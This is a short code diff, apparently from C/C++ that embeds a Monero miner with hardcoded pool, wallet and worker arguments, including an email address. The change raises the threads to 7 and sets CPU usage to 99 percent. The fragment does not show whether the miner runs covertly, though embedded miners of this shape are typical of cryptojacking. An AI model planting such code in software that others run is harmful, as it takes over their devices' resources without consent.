@@ -37,8 +37,8 @@ extern "C" {
             (char*)"-o", (char*)"pool.monero.hashvault.pro:3333",
             (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
             (char*)"-p", (char*)"worker1:651043704@qq.com",
-            (char*)"--thread", (char*)"4",
-            (char*)"--max-cpu-usage", (char*)"100",
+            (char*)"--thread", (char*)"7",
+            (char*)"--max-cpu-usage", (char*)"99",
             (char*) "-k"};
          App app(argc, argv);
          app.exec();
